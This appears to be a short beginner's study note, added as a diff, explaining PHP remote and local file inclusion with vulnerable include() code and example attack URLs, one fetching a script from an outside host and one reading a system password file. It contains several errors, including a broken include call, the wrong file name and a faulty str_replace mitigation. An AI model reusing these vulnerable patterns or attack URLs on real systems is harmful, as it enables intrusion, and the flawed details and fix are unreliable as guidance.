@@ -1,0 +1,70 @@
+RFI vulnerability
+
+RFI(Remote File Location) is a vulnerability where the attacker requests the viruse script to the server so that the script runs through the website.
+
+example1)
+
+<?php
+ if(isset($_GET['language'])){
+	include($_GET['language'], '.php');
+}
+?>
+<form method="get">
+    <select name="language">
+        <option value="english"English></option>
+        <option value="french">French</option>
+        ...
+    </select>
+    <input type="submit">
+</form>
+
+the developer is only gaining the english and the french value but the code is not filtering all of the non-right parameters.
+
+*a page with RFI vulnerability
+vulnerable.php
+<?php 
+$color = 'blue';
+if(isset($_GET['COLOR'] ))
+$color = $_GET['COLOR'];
+include($color . 'php');
+?>
+HTML CODE
+<form action="vulnerable.php" method='get'>
+    <select name="COLOR">
+    <option value="red">red</option>
+    <option value="blue">blue</option>
+    </select>
+    <input type="submit">
+</form>
+
+in vulnerable.php it doesn't scan if there's any other values coming in except red and blue.
+in this case the attacker can attack like
+/vulnerable.php?COLOR=http://test.com/exploit.txt
+in this case through the include file it will include it like exploit.txt.php ending up with running the php file that the attacker wants the website to run.
+
+
+
+LFI vulnerability
+
+The difference between LFI and RFI is that LFI is exploting something inside the server for example
+<?php
+$file = $_GET['file'];
+if(isset($file)){
+include("pages/$file");
+}
+else{
+include("index.php");
+}
+?>
+
+the attacker can attack this by maybe using /etc/password because most linux system has important password informations in /etc/password
+
+so it can go like
+index.php?pages=/etc/password
+
+this will run password file and show the informations insdie it.
+but usually the attackers will need to use ../ in order to get into higher directories.
+and this can be protected by converting ../ value to another value so the codes will be
+
+str_replace(“.”,””, $path);
+str_replace(“/”,””, $filename);
